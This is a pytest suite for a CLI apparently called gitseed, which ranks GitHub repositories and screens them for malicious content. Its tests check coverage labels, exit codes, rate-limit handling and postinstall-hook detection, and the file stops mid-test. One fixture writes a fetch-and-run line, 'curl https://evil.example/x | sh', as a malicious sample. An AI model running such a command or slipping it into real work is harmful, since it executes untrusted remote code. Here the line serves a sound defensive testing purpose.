"""The CLI keeps its offline fixture path and its fail-closed exit status honest."""

from __future__ import annotations

import io
import json
from base64 import b64encode
from pathlib import Path

from gitseed import cli
from gitseed.application import execute
from gitseed.artifact import RunArtifact, SCHEMA_VERSION
from gitseed.cli import (
    SOURCE_FILE_BYTE_CAP,
    SOURCE_FILE_COUNT_CAP,
    SOURCE_TOTAL_BYTE_CAP,
    GitHubClient,
    main,
)
from gitseed.evidence import ClaimBasis
from gitseed.grade.smoke import SmokeResult
from gitseed.grade.types import GradeResult
from gitseed.pipeline.run import FetchedFiles
from gitseed.ports import RepositoryMetadata, RunPorts, RunRequest
from gitseed.collect.search import Candidate, CollectResult
from gitseed.scoring import ScoreInputs


FIXTURES = Path(__file__).parent / "fixtures"


def _write_fixture(root: Path, *, complete: bool = True) -> None:
    """Create the smallest replayable repository set for a CLI boundary test."""
    root.mkdir(exist_ok=True)
    (root / "clean").mkdir()
    (root / "malicious").mkdir()
    (root / "clean" / "main.py").write_text("def add(a, b):\n    return a + b\n")
    (root / "malicious" / "setup.sh").write_text("curl https://evil.example/x | sh\n")
    (root / "candidates.json").write_text(
        json.dumps(
            {
                "complete": complete,
                "stopped_because": "fixture rate limit" if not complete else None,
                "candidates": [
                    {
                        "full_name": "fixture/clean",
                        "html_url": "https://github.com/fixture/clean",
                        "stargazers_count": 8,
                        "pushed_at": "2026-07-27T00:00:00Z",
                        "files": "clean",
                    },
                    {
                        "full_name": "fixture/malicious",
                        "html_url": "https://github.com/fixture/malicious",
                        "stargazers_count": 1,
                        "pushed_at": "2026-07-27T00:00:00Z",
                        "files": "malicious",
                    },
                ],
            }
        )
    )
    (root / "grades.json").write_text(
        json.dumps(
            {
                "fixture/clean": {
                    "idea": 8,
                    "skill": 7,
                    "description": "small utility",
                    "model": "fixture",
                    "temperature": 0.0,
                    "prompt_version": "fixture-v1",
                }
            }
        )
    )


def test_run_over_fixtures_prints_a_ranked_table(capsys) -> None:
    # Given: the checked-in fixture replay has one clean and one withheld repository.
    # When: an operator runs the default dry-run path.
    exit_code = main(["run", "--query", "example", "--fixtures", str(FIXTURES)])
    # Then: both records remain visible in rank order.
    captured = capsys.readouterr()
    assert exit_code == 0
    assert "fixture/clean" in captured.out
    assert "fixture/malicious" in captured.out
    assert "withheld" in captured.out
    assert "insufficient-evidence" in captured.out
    assert "candidate coverage: 3/3 search results (complete)" in captured.out


def test_search_timeout_is_printed_and_preserved_in_the_artifact(tmp_path, capsys) -> None:
    # Given: GitHub returns two candidates from a four-result search it timed out.
    _write_fixture(tmp_path)
    fixture = tmp_path / "candidates.json"
    payload = json.loads(fixture.read_text())
    payload.update({"incomplete_results": True, "total_count": 4})
    fixture.write_text(json.dumps(payload))
    artifact = tmp_path / "run.json"

    # When: the normal dry-run path records and prints the result.
    exit_code = main(
        ["run", "--query", "example", "--fixtures", str(tmp_path), "--artifact", str(artifact)]
    )

    # Then: the visible candidate count and replayable record retain the timeout distinction.
    captured = capsys.readouterr()
    assert exit_code == 0
    assert "candidate coverage: 2/4 search results (partial: GitHub reported a partial search)" in captured.out
    collection = json.loads(artifact.read_text())["ports"]["collection"]
    assert collection["incomplete_results"] is True
    assert collection["total_count"] == 4


def test_cli_reports_a_total_larger_than_the_retrieved_candidates(tmp_path, capsys) -> None:
    # Given: GitHub reports four matches while this run retrieved only two.
    _write_fixture(tmp_path)
    fixture = tmp_path / "candidates.json"
    payload = json.loads(fixture.read_text())
    payload["total_count"] = 4
    fixture.write_text(json.dumps(payload))

    # When: the CLI renders the dry-run result.
    exit_code = main(["run", "--query", "example", "--fixtures", str(tmp_path)])

    # Then: the count is visibly partial even though GitHub did not flag a timeout.
    captured = capsys.readouterr()
    assert exit_code == 0
    assert "candidate coverage: 2/4 search results (partial)" in captured.out


def test_a_failed_model_smoke_gate_labels_the_run_and_artifact(tmp_path, capsys) -> None:
    # Given: identical deterministic inputs and one model that cannot keep its fields separate.
    class UnusableGrader(_Grader):
        def evaluate(self, digest: str) -> GradeResult:
            self.seen.append(digest)
            return GradeResult(7, 6, "WARNING: maybe unsafe", "test", 0.0, "v1")

    full_artifact = tmp_path / "full.json"
    degraded_artifact = tmp_path / "degraded.json"
    options = ["run", "--query", "example"]

    # When: each run reaches the same readable repository.
    full_code = main(
        [*options, "--artifact", str(full_artifact)],
        transport=_NoWriteTransport(),
        fetch_files=lambda _: FetchedFiles((("main.py", "x = 1\n"),)),
        grader=_Grader(),
    )
    full = capsys.readouterr()
    degraded_code = main(
        [*options, "--artifact", str(degraded_artifact)],
        transport=_NoWriteTransport(),
        fetch_files=lambda _: FetchedFiles((("main.py", "x = 1\n"),)),
        grader=UnusableGrader(),
    )
    degraded = capsys.readouterr()

    # Then: deleting the coverage label or its artifact field makes this test fail.
    assert full_code == 0
    assert degraded_code == 2
    assert "model coverage: model\n" in full.out
    assert "model coverage: absent (deterministic-only)\n" in degraded.out
    assert "model smoke gate failed" in degraded.err
    payload = json.loads(degraded_artifact.read_text())
    assert payload["output"]["result"]["grading_basis"] == "absent"
    assert payload["ports"]["model_smoke"]["passed"] is False


def test_an_unreachable_model_falls_back_to_a_labeled_deterministic_run(monkeypatch, capsys) -> None:
    # Given: Ollama cannot answer the model discovery request.
    class OfflineOllama:
        def __init__(self, *args, **kwargs) -> None:
            pass

        def get(self, url: str) -> tuple[int, dict[str, str], bytes]:
            raise OSError("connection refused")

    monkeypatch.setattr(cli, "UrllibTransport", OfflineOllama)

    # When: the normal CLI path starts a run.
    exit_code = main(
        ["run", "--query", "example"],
        transport=_NoWriteTransport(),
        fetch_files=lambda _: FetchedFiles((("main.py", "x = 1\n"),)),
    )

    # Then: removing resolution fallback makes this test fail instead of returning the incomplete run.
    captured = capsys.readouterr()
    assert exit_code == 2
    assert "model coverage: absent (deterministic-only)" in captured.out
    assert "could not reach Ollama" in captured.err


def test_radar_defaults_to_dry_run_before_any_approval_path() -> None:
    # Given: the product command is invoked without an explicit write option.
    args = cli._parser().parse_args(["radar", "--query", "example"])

    # When/Then: approval collection is not reachable unless dry-run is disabled.
    assert args.dry_run is True


def test_recorded_run_renders_offline_with_identical_output(tmp_path, capsys) -> None:
    # Given: a fixture-backed run records one canonical artifact.
    artifact = tmp_path / "run.json"
    live_code = main(
        [
            "run",
            "--query",
            "example",
            "--fixtures",
            str(FIXTURES),
            "--artifact",
            str(artifact),
        ]
    )
    live = capsys.readouterr()

    # When: the CLI renders only that artifact.
    render_code = main(["render", str(artifact)])
    rendered = capsys.readouterr()

    # Then: rendering performs no live I/O and returns the same result.
    assert live_code == render_code == 0
    assert rendered.out == live.out
    assert live.err == ""
    assert rendered.err == "source: render artifact\n"


def test_radar_render_cannot_reach_approval_without_disabling_dry_run(tmp_path, monkeypatch, capsys) -> None:
    # Given: a canonical artifact and an approval path that must stay untouched.
    artifact = tmp_path / "run.json"
    assert main(["radar", "--query", "example", "--fixtures", str(FIXTURES), "--artifact", str(artifact)]) == 0
    monkeypatch.setattr(cli, "_approvals", lambda *args, **kwargs: (_ for _ in ()).throw(AssertionError("approval reached")))

    # When: radar runs normally and then renders the recorded queue.
    radar_code = main(["radar", "--query", "example", "--fixtures", str(FIXTURES)])
    exit_code = main(["radar", "--render", str(artifact)])

    # Then: it remains a read-only render and says so.
    captured = capsys.readouterr()
    assert radar_code == exit_code == 0
    assert "source: rendered artifact" in captured.err


def test_every_command_help_documents_the_exit_code_convention() -> None:
    # Given: every public command parser.
    parser = cli._parser()

    # When/Then: help gives one shared meaning to its process status.
    for command in ("radar", "run", "render", "replay", "re-evaluate", "explain", "export"):
        help_text = parser._subparsers._group_actions[0].choices[command].format_help()
        assert " ".join(cli.EXIT_CODES.split()) in " ".join(help_text.split())


def test_explain_names_unavailable_features_and_weight_version(tmp_path, capsys) -> None:
    # Given: fixture metadata has no score inputs, so every feature is unavailable.
    artifact = tmp_path / "run.json"
    assert main(["radar", "--query", "example", "--fixtures", str(FIXTURES), "--artifact", str(artifact)]) == 0
    capsys.readouterr()

    # When: an operator asks why the graded repository was scored.
    exit_code = main(["explain", "fixture/clean", "--artifact", str(artifact)])

    # Then: unavailable inputs are named rather than silently counted as zero.
    captured = capsys.readouterr()
    assert exit_code == 0
    assert "weight set: m0-contributions-v1" in captured.out
    assert "unavailable features: commit_cadence_30d, contributor_count, has_license" in captured.out
    assert "source: replayed artifact" in captured.err


def test_coverage_reaches_explain_and_export(tmp_path, capsys) -> None:
    # Given: the fixture has readable source but unavailable score metadata.
    artifact = tmp_path / "run.json"
    assert main(["radar", "--query", "example", "--fixtures", str(FIXTURES), "--artifact", str(artifact)]) == 0
    capsys.readouterr()

    # When: a human explains it and a program exports it.
    assert main(["explain", "fixture/clean", "--artifact", str(artifact)]) == 0
    explained = capsys.readouterr()
    assert main(["export", str(artifact)]) == 0
    exported = json.loads(capsys.readouterr().out)

    # Then: both surfaces retain score and security evidence coverage.
    assert "score coverage: 0/3" in explained.out
    assert "security coverage: deterministic (a_logger.py" in explained.out
    score = exported["output"]["scores"][0]["score"]
    reviewed = exported["output"]["result"]["reviewed"][0]
    assert score["basis"] == "absent"
    assert score["coverage"] == []
    assert reviewed["screening_basis"] == "deterministic"
    assert reviewed["screened_files"] == [
        "a_logger.py",
        "b_setup.sh",
        "c_package.json",
        "d_client.py",
        "e_hash.py",
        "f_config.py",
        "g_readme.md",
        "h_docker.sh",
        "i_key.py",
        "j_ci.yml",
    ]


def test_every_failed_read_reports_zero_coverage_not_a_clean_run(tmp_path, capsys) -> None:
    # Given: collection succeeds but the sole repository's source read fails.
    candidate = Candidate("org/unreadable", "org", "", 0, "")

    class Repository:
        def search(self, query: str, limit: int) -> CollectResult:
            return CollectResult(candidates=[candidate])

        def metadata(self, item: Candidate, at) -> RepositoryMetadata:
            return RepositoryMetadata(ScoreInputs(True, True, True))

    class Files:
        def read(self, item: Candidate) -> FetchedFiles:
            raise OSError("offline")

    class Clock:
        def now(self):
            from datetime import datetime, timezone

            return datetime(2026, 7, 27, tzinfo=timezone.utc)

    artifact = tmp_path / "failed-reads.json"
    artifact.write_bytes(execute(RunRequest("example", 1), RunPorts(Repository(), Files(), _Grader(), Clock())).to_bytes())

    # When: an operator explains the recorded run.
    exit_code = main(["explain", "org/unreadable", "--artifact", str(artifact)])

    # Then: no finding is never rendered as clean when coverage is absent.
    captured = capsys.readouterr()
    assert exit_code == 2
    assert captured.out == (
        "Score measures small-versus-medium size; it does not predict that a repository will take off.\n"
        "repository: org/unreadable\n"
        "weight set: m0-contributions-v1\n"
        "score: 0.119096\n"
        "commit_cadence_30d: 0.093318\n"
        "contributor_count: 0.016129\n"
        "has_license: 0.009649\n"
        "score coverage: 3/3\n"
        "unavailable features: none\n"
        "security coverage: absent (0 files)\n"
        "model coverage: model\n"
        "security findings: none\n"
        "unverified security claims: none\n"
        "risk: unknown\n"
        "recommendation: insufficient-evidence\n"
    )
    assert "org/unreadable: could not read files (offline)\n" in captured.err


def test_export_writes_the_canonical_versioned_artifact_and_round_trips(tmp_path, capsys) -> None:
    # Given: radar recorded one canonical run artifact.
    artifact = tmp_path / "run.json"
    assert main(["radar", "--query", "example", "--fixtures", str(FIXTURES), "--artifact", str(artifact)]) == 0
    capsys.readouterr()

    # When: export writes that run for a machine consumer.
    exit_code = main(["export", str(artifact)])

    # Then: the unchanged artifact schema is versioned and parseable.
    captured = capsys.readouterr()
    exported = captured.out.encode()
    assert exit_code == 0
    assert json.loads(exported)["schema"] == SCHEMA_VERSION
    assert RunArtifact.from_bytes(exported).to_bytes() == exported
    assert "source: replayed artifact" in captured.err


def test_an_incomplete_collection_exits_two_after_printing_the_ranking(tmp_path, capsys) -> None:
    # Given: collection retained candidates before reporting its limit.
    _write_fixture(tmp_path, complete=False)
    # When: the pipeline runs against the replay.
    exit_code = main(["run", "--query", "example", "--fixtures", str(tmp_path)])
    # Then: the usable ranking stays visible but cannot be mistaken for a complete result.
    captured = capsys.readouterr()
    assert exit_code == 2
    assert "fixture/clean" in captured.out
    assert "fixture rate limit" in captured.err


class _UnavailableTransport:
    def get(self, url: str) -> tuple[int, dict[str, str], bytes]:
        raise OSError("network unavailable")


def test_a_transport_error_is_a_one_line_failure_not_a_traceback() -> None:
    # Given: the GitHub transport cannot connect.
    errors = io.StringIO()
    # When: the command runs without debug output.
    exit_code = main(
        ["run", "--query", "example"],
        transport=_UnavailableTransport(),
        grader=_Grader(),
        stderr=errors,
    )
    # Then: users get one actionable line and a failure exit status.
    assert exit_code == 1
    assert errors.getvalue() == "run failed: network unavailable\n"


def test_debug_mode_includes_the_transport_traceback() -> None:
    # Given: the same transport failure with diagnostic output enabled.
    errors = io.StringIO()
    # When: the command runs in debug mode.
    exit_code = main(
        ["run", "--query", "example", "--debug"],
        transport=_UnavailableTransport(),
        grader=_Grader(),
        stderr=errors,
    )
    # Then: the concise message retains the traceback for diagnosis.
    assert exit_code == 1
    assert "Traceback (most recent call last):" in errors.getvalue()
    assert "OSError: network unavailable" in errors.getvalue()


def test_an_invalid_invocation_exits_one() -> None:
    errors = io.StringIO()
    assert main(["run", "--query", "example", "--limit", "0"], stderr=errors) == 1
    assert errors.getvalue() == "invalid invocation: --limit must be positive\n"


class _NoWriteTransport:
    """A test double that fails if dry-run reaches an external action."""

    def get(self, url: str) -> tuple[int, dict[str, str], bytes]:
        return 200, {"X-RateLimit-Remaining": "1"}, json.dumps(
            {"items": [{"full_name": "fixture/clean", "html_url": "https://github.com/fixture/clean"}]}
        ).encode()

    def star(self, repo: str) -> None:
        raise AssertionError(f"unexpected star: {repo}")

    def unstar(self, repo: str) -> None:
        raise AssertionError(f"unexpected unstar: {repo}")

    def follow(self, user: str) -> None:
        raise AssertionError(f"unexpected follow: {user}")

    def unfollow(self, user: str) -> None:
        raise AssertionError(f"unexpected unfollow: {user}")


class _Grader:
    def __init__(self) -> None:
        self.seen: list[str] = []

    def evaluate(self, digest: str) -> GradeResult:
        self.seen.append(digest)
        return GradeResult(idea=7, skill=6, description="d", model="test", temperature=0.0, prompt_version="v1")

    def flags_malicious(self, digest: str) -> bool:
        return "base64.b64decode" in digest


class _GitHubTransport:
    def __init__(
        self,
        tree: list[dict[str, str | int]],
        blobs: dict[str, tuple[int, str]],
        *,
        tree_response: tuple[int, dict[str, str]] | None = None,
        blob_headers: dict[str, dict[str, str]] | None = None,
    ) -> None:
        self.tree = tree
        self.blobs = blobs
        self.tree_response = tree_response
        self.blob_headers = {} if blob_headers is None else blob_headers
        self.urls: list[str] = []

    def get(self, url: str) -> tuple[int, dict[str, str], bytes]:
        self.urls.append(url)
        if url.endswith("?recursive=1"):
            if self.tree_response is not None:
                status, headers = self.tree_response
                return status, headers, b""
            return 200, {}, json.dumps({"tree": self.tree}).encode()
        status, content = self.blobs[url]
        return status, self.blob_headers.get(url, {}), json.dumps({"content": b64encode(content.encode()).decode()}).encode()


class _ScriptedTransport:
    def __init__(self, responses: list[tuple[int, dict[str, str], bytes]]) -> None:
        self.responses = responses

    def get(self, url: str) -> tuple[int, dict[str, str], bytes]:
        return self.responses.pop(0)


def _tree_entry(path: str, size: int) -> dict[str, str | int]:
    return {"type": "blob", "path": path, "size": size, "url": f"blob://{path}"}


def test_github_fetches_only_allowed_source_files() -> None:
    # Given: GitHub's listing mixes source with ungradeable binary and lock files.
    transport = _GitHubTransport(
        [_tree_entry("images/logo.png", 20), _tree_entry("poetry.lock", 20), _tree_entry("a.py", 20), _tree_entry("b.py", 20)],
        {"blob://a.py": (200, "a = 1\n"), "blob://b.py": (200, "b = 2\n")},
    )
    # When: a candidate's source digest is collected.
    fetched = GitHubClient(transport).fetch_files(cli.Candidate("org/repo", "org", "", 0, ""))
    # Then: only the two source blobs were requested and retained.
    assert [path for path, _ in fetched.files] == ["a.py", "b.py"]
    assert transport.urls == [
        "https://api.github.com/repos/org/repo/git/trees/HEAD?recursive=1",
        "blob://a.py",
        "blob://b.py",
    ]


def test_github_records_files_over_the_byte_cap_without_fetching_them() -> None:
    # Given: a candidate contains one source file too large for a model digest.
    transport = _GitHubTransport([_tree_entry("large.py", SOURCE_FILE_BYTE_CAP + 1)], {})
    # When: source collection applies the listing's byte limit before blob reads.
    fetched = GitHubClient(transport).fetch_files(cli.Candidate("org/repo", "org", "", 0, ""))
    # Then: the skip is visible and no blob request happened.
    assert fetched.files == ()
    assert fetched.skipped == (f"large.py: exceeds {SOURCE_FILE_BYTE_CAP}-byte cap",)
    assert len(transport.urls) == 1


def test_github_enforces_file_count_and_total_byte_caps_before_blob_reads() -> None:
    # Given: the listing is larger than both digest budgets.
    count_entries = [_tree_entry(f"count-{index}.py", 1) for index in range(SOURCE_FILE_COUNT_CAP + 1)]
    total_entries = [_tree_entry(f"total-{index}.py", SOURCE_FILE_BYTE_CAP) for index in range(6)]
    count_transport = _GitHubTransport(count_entries, {str(entry["url"]): (200, "x\n") for entry in count_entries})
    total_transport = _GitHubTransport(total_entries, {str(entry["url"]): (200, "x\n") for entry in total_entries})
    # When: source collection selects blobs from the tree listing.
    count_fetched = GitHubClient(count_transport).fetch_files(cli.Candidate("org/repo", "org", "", 0, ""))
    total_fetched = GitHubClient(total_transport).fetch_files(cli.Candidate("org/repo", "org", "", 0, ""))
    # Then: no more than either configured budget reaches GitHub's blob endpoint.
    assert len(count_fetched.files) == SOURCE_FILE_COUNT_CAP
    assert any("count cap" in skipped for skipped in count_fetched.skipped)
    assert sum(SOURCE_FILE_BYTE_CAP for _ in total_fetched.files) <= SOURCE_TOTAL_BYTE_CAP
    assert any("total-byte cap" in skipped for skipped in total_fetched.skipped)


def test_github_skips_a_forbidden_blob_and_the_pipeline_still_grades_readable_source() -> None:
    # Given: one selected source blob is forbidden while another remains readable.
    transport = _GitHubTransport(
        [_tree_entry("blocked.py", 1), _tree_entry("readable.py", 1)],
        {"blob://blocked.py": (403, ""), "blob://readable.py": (200, "x = 1\n")},
    )
    grader = _Grader()
    # When: the pipeline carries the partial source result into grading.
    result = cli.run(
        cli.CollectResult(candidates=[cli.Candidate("org/repo", "org", "", 0, "")]),
        fetch_files=GitHubClient(transport).fetch_files,
        grader=grader,
    )
    # Then: the readable source is graded and the failed blob is retained as incomplete evidence.
    assert result.reviewed[0].grade is not None
    assert "blocked.py: GitHub access is forbidden; waiting will not help" in result.reviewed[0].skipped_files
    assert result.complete is False


def test_github_names_an_exhausted_quota_and_reports_it_once_for_the_run() -> None:
    # Given: two repositories reach GitHub after the same exhausted quota response.
    headers = {"X-RateLimit-Remaining": "0", "X-RateLimit-Reset": "2000000000"}

    def exhausted(candidate: cli.Candidate) -> FetchedFiles:
        transport = _GitHubTransport([], {}, tree_response=(403, headers))
        return GitHubClient(transport).fetch_files(candidate)

    # When: the pipeline keeps both candidates visible.
    result = cli.run(
        cli.CollectResult(candidates=[cli.Candidate("org/one", "org", "", 0, ""), cli.Candidate("org/two", "org", "", 0, "")]),
        fetch_files=exhausted,
        grader=_Grader(),
    )
    # Then: each withheld record is actionable, while the run-level cause is not repeated.
    assert all("rate limit exhausted" in (entry.withheld or "") for entry in result.reviewed)
    assert "2033-05-18" in result.incomplete_because[0]
    assert result.incomplete_because == [result.incomplete_because[0]]


def test_github_names_secondary_limiting_for_a_retry_after_response() -> None:
    # Given: GitHub asks the blob reader to wait before retrying.
    transport = _GitHubTransport(
        [_tree_entry("blocked.py", 1)],
        {"blob://blocked.py": (403, "")},
        blob_headers={"blob://blocked.py": {"Retry-After": "60"}},
    )
    # When: the file fetch receives that response.
    fetched = GitHubClient(transport).fetch_files(cli.Candidate("org/repo", "org", "", 0, ""))
    # Then: the skipped-file reason identifies a waitable secondary limit.
    assert "secondary rate limit" in fetched.skipped[0]
    assert "retry at" in fetched.skipped[0]


def test_github_names_forbidden_access_as_not_waitable() -> None:
    # Given: GitHub refuses a tree request with quota left and no Retry-After --
    # issue #6's real, live-verified shape (2026-07-28, GET
    # repos/torvalds/linux/collaborators through gitseed's own UrllibTransport):
    # HTTP 403, X-RateLimit-Remaining in the thousands, no Retry-After header,
    # body {"message": "Must have push access...", "status": "403"}. Budget-left
    # headers (not the empty ones a synthetic 403 might use) are what actually
    # distinguish this from the rate-limited branch in classify().
    real_forbidden_headers = {"X-RateLimit-Limit": "5000", "X-RateLimit-Remaining": "4900"}
    transport = _GitHubTransport([], {}, tree_response=(403, real_forbidden_headers))
    # When: the candidate reaches file collection.
    result = cli.run(
        cli.CollectResult(candidates=[cli.Candidate("org/repo", "org", "", 0, "")]),
        fetch_files=GitHubClient(transport).fetch_files,
        grader=_Grader(),
    )
    # Then: the withheld reason does not suggest a futile wait, and the absence of
    # evidence is recorded as absent -- not as "none" (a clean scan) and not as a
    # falsy-but-present score. This is F11's discipline reaching the collection
    # layer: a resource that could not be read is not a resource that had nothing.
    entry = result.reviewed[0]
    assert "waiting will not help" in (entry.withheld or "")
    assert entry.severity == "unknown"
    assert entry.screening_basis is ClaimBasis.ABSENT
    assert entry.score is None
    assert result.complete is False


# --- GS-P0-001: priority filenames reach the scanner regardless of extension ---
# --- GS-P0-008: what the count/byte caps left unscanned is never silent -------


class _LiveGitHubTransport:
    """Search, tree, and blob endpoints together -- the whole path a live
    `main()` run takes, not a fixture directory read standing in for it."""

    def __init__(self, search_items: list[dict[str, object]], tree: list[dict[str, str | int]], blobs: dict[str, tuple[int, str]]) -> None:
        self.search_items = search_items
        self.tree = tree
        self.blobs = blobs
        self.urls: list[str] = []

    def get(self, url: str) -> tuple[int, dict[str, str], bytes]:
        self.urls.append(url)
        if "/search/repositories" in url:
            return 200, {"X-RateLimit-Remaining": "10"}, json.dumps({"items": self.search_items}).encode()
        if url.endswith("?recursive=1"):
            return 200, {}, json.dumps({"tree": self.tree}).encode()
        # Repository metadata (commit cadence, contributors, license) is
        # outside what this suite is proving; answer it minimally so a
        # missing response cannot mask the security assertions below inside
        # an unrelated "repository metadata failed" incompleteness.
        if "/commits" in url or "/contributors" in url:
            return 200, {}, b"[]"
        if url.endswith("/license"):
            return 404, {}, b""
        status, content = self.blobs[url]
        return status, {}, json.dumps({"content": b64encode(content.encode()).decode()}).encode()


def test_priority_path_matches_manifests_lockfiles_and_one_level_workflows() -> None:
    # Given/When/Then: the allow-list is by exact filename or a flat workflow
    # path, not a suffix or a nested directory.
    assert cli._is_priority_path("package.json")
    assert cli._is_priority_path("backend/package.json")
    assert cli._is_priority_path(".github/workflows/ci.yml")
    assert cli._is_priority_path(".github/workflows/release.yaml")
    assert not cli._is_priority_path(".github/workflows/nested/ci.yml")
    assert not cli._is_priority_path("workflows/ci.yml")
    assert not cli._is_priority_path("poetry.lock")
    assert not cli._is_priority_path("random.json")


def test_live_adapter_finds_a_postinstall_hook_and_blocks_before_grading(tmp_path, capsys) -> None:
    """GS-P0-001's own acceptance test: GitHub's tree -> GitHubClient.fetch_files
    -> the postinstall rule in signals.py -> a blocked candidate the model never
    sees. Not a FixtureTransport directory read, which is exactly what let this
    bug ship undetected in the first place."""
    # Given: a live tree whose only file is a package.json with a postinstall hook.
    manifest = '{\n  "name": "x",\n  "scripts": {\n    "postinstall": "node install.js"\n  }\n}\n'
    search_items = [{"full_name": "org/repo", "html_url": "https://github.com/org/repo", "stargazers_count": 3, "pushed_at": "2026-07-27T00:00:00Z"}]
    transport = _LiveGitHubTransport(search_items, [_tree_entry("package.json", len(manifest))], {"blob://package.json": (200, manifest)})
    grader = _Grader()
    artifact_path = tmp_path / "run.json"

    # When: a live (non-fixture) run reaches file selection through the real adapter.
    exit_code = main(["run", "--query", "example", "--artifact", str(artifact_path)], transport=transport, grader=grader)
    table = capsys.readouterr().out

    # Then: package.json reached the scanner and the postinstall signal
    # blocked the candidate at high severity before grading. The model is
    # still consulted for the run-level smoke gate (synthetic digests, run
    # once regardless of any candidate), so the precise claim is that
    # org/repo's own content was never among what it was asked to grade.
    assert exit_code == 0
    assert not any("org/repo" in digest for digest in grader.seen)
    assert "withheld" in table

    explain_code = main(["explain", "org/repo", "--artifact", str(artifact_path)])
    explained = capsys.readouterr().out
    assert explain_code == 0
    assert "postinstall at package.json" in explained
    assert "risk: high\n" in explained


def test_a_priority_manifest_survives_the_count_cap_even_ordered_last() -> None:
    # Given: the file-count budget is already full of safe files before a
    # malicious priority manifest appears as the tree's very last entry --
    # exactly the padding attack GS-P0-008 names.
    safe_entries = [_tree_entry(f"safe-{index}.py", 1) for index in range(SOURCE_FILE_COUNT_CAP)]
    manifest = '{\n  "scripts": {\n    "postinstall": "node install.js"\n  }\n}\n'
    tree = [*safe_entries, _tree_entry("package.json", len(manifest))]
    blobs = {str(entry["url"]): (200, "x = 1\n") for entry in safe_entries}
    blobs["blob://package.json"] = (200, manifest)
    transport = _GitHubTransport(tree, blobs)

    # When: source selection walks the whole tree.
    fetched = GitHubClient(transport).fetch_files(cli.Candidate("org/repo", "org", "", 0, ""))

    # Then: the manifest was selected in addition to every safe file, not
    # instead of one of them -- its tree position cost it nothing.
    paths = [path for path, _ in fetched.files]
    assert len(paths) == SOURCE_FILE_COUNT_CAP + 1
    assert "package.json" in paths

    # And: it still reaches the scanner and blocks the candidate.
    result = cli.run(
        cli.CollectResult(candidates=[cli.Candidate("org/repo", "org", "", 0, "")]),
        fetch_files=lambda _: fetched,
        grader=_Grader(),
    )
    entry = result.reviewed[0]
    assert entry.severity == "high"
    assert any(signal.kind == "postinstall" for signal in entry.findings)


def test_source_coverage_survives_an_artifact_round_trip(tmp_path) -> None:
    """The fixture-backed round-trip test never exercises this: fixtures never
    set `coverage` at all, so a bug in its (de)serialization could pass every
    other test in this file."""
    # Given: a live run that actually populates SourceCoverage.
    manifest = '{\n  "scripts": {\n    "postinstall": "node install.js"\n  }\n}\n'
    search_items = [{"full_name": "org/repo", "html_url": "https://github.com/org/repo", "stargazers_count": 3, "pushed_at": "2026-07-27T00:00:00Z"}]
    transport = _LiveGitHubTransport(
        search_items,
        [_tree_entry("package.json", len(manifest)), _tree_entry("a.py", 5)],
        {"blob://package.json": (200, manifest), "blob://a.py": (200, "x=1\n")},
    )
    artifact_path = tmp_path / "run.json"

    # When: the run is recorded and then replayed from its own bytes.
    assert main(["run", "--query", "example", "--artifact", str(artifact_path)], transport=transport, grader=_Grader()) == 0
    raw = artifact_path.read_bytes()
    roundtripped = RunArtifact.from_bytes(raw).to_bytes()

    # Then: byte-for-byte identical, and the coverage counts are the real ones.
    assert roundtripped == raw
    reviewed = json.loads(raw)["output"]["result"]["reviewed"][0]
    assert reviewed["coverage"] == {
        "discovered_files": 2,
        "eligible_files": 2,
        "scanned_files": 2,
        "skipped_policy": [],
        "skipped_error": [],
    }


def test_priority_files_still_respect_the_byte_caps() -> None:
    # Given: exemption from the count cap is not exemption from every cap --
    # an oversized manifest is still a resource-exhaustion vector.
    transport = _GitHubTransport([_tree_entry("package.json", SOURCE_FILE_BYTE_CAP + 1)], {})
    # When: source selection applies the per-file byte limit.
    fetched = GitHubClient(transport).fetch_files(cli.Candidate("org/repo", "org", "", 0, ""))
    # Then: the manifest is skipped, not silently truncated.
    assert fetched.files == ()
    assert any("byte cap" in skipped for skipped in fetched.skipped)


def test_a_partial_count_capped_scan_that_found_nothing_is_not_reported_as_clean() -> None:
    """GS-P0-008's exact scenario: 200 eligible files, only the count cap's
    worth actually scanned, none of the twenty trip a signal. Severity must not
    read the same as a full scan that found nothing."""
    # Given: far more eligible source files than the count cap admits.
    entries = [_tree_entry(f"clean-{index}.py", 1) for index in range(200)]
    blobs = {str(entry["url"]): (200, "x = 1\n") for entry in entries[:SOURCE_FILE_COUNT_CAP]}
    transport = _GitHubTransport(entries, blobs)

    # When: source selection and screening both run.
    fetched = GitHubClient(transport).fetch_files(cli.Candidate("org/repo", "org", "", 0, ""))
    result = cli.run(
        cli.CollectResult(candidates=[cli.Candidate("org/repo", "org", "", 0, "")]),
        fetch_files=lambda _: fetched,
        grader=_Grader(),
    )

    # Then: the coverage record admits what was left unscanned...
    assert fetched.coverage.discovered_files == 200
    assert fetched.coverage.eligible_files == 200
    assert fetched.coverage.scanned_files == SOURCE_FILE_COUNT_CAP
    assert fetched.coverage.complete_for_policy is False
    # ...and severity is not the bare "none" a genuinely complete scan reports.
    entry = result.reviewed[0]
    assert entry.findings == ()
    assert entry.severity == "none-found-in-scanned-files"
    assert entry.severity != "none"
    assert entry.coverage == fetched.coverage


def test_a_partial_scan_is_never_rendered_as_clean_by_the_live_cli_path(tmp_path, capsys) -> None:
    # Given: the same 200-eligible/20-scanned shape, reached through the full
    # CLI rather than the pipeline function directly.
    entries = [_tree_entry(f"clean-{index}.py", 1) for index in range(200)]
    blobs = {str(entry["url"]): (200, "x = 1\n") for entry in entries[:SOURCE_FILE_COUNT_CAP]}
    search_items = [{"full_name": "org/repo", "html_url": "https://github.com/org/repo", "stargazers_count": 3, "pushed_at": "2026-07-27T00:00:00Z"}]
    transport = _LiveGitHubTransport(search_items, entries, blobs)
    artifact_path = tmp_path / "run.json"

    # When: a live run renders its normal ranked table.
    exit_code = main(["run", "--query", "example", "--artifact", str(artifact_path)], transport=transport, grader=_Grader())
    table = capsys.readouterr().out

    # Then: the risk column names the coverage gap instead of a bare "none".
    assert exit_code == 0
    assert "none-found-in-scanned-files" in table

    # And: explain names both the coverage gap and the risk it produces.
    explain_code = main(["explain", "org/repo", "--artifact", str(artifact_path)])
    explained = capsys.readouterr().out
    assert explain_code == 0
    assert f"file coverage: {SOURCE_FILE_COUNT_CAP}/200 eligible files scanned, 200 discovered (incomplete_for_policy)\n" in explained
    assert "risk: none-found-in-scanned-files\n" in explained


def test_a_run_where_every_eligible_file_is_policy_skipped_reports_no_coverage_not_clean() -> None:
    """GS-P0-008's acceptance test: nothing was scanned at all, so the run must
    not read as a clean pass."""
    # Given: every discovered file fails the extension/priority allow-list --
    # none is even eligible, let alone scanned.
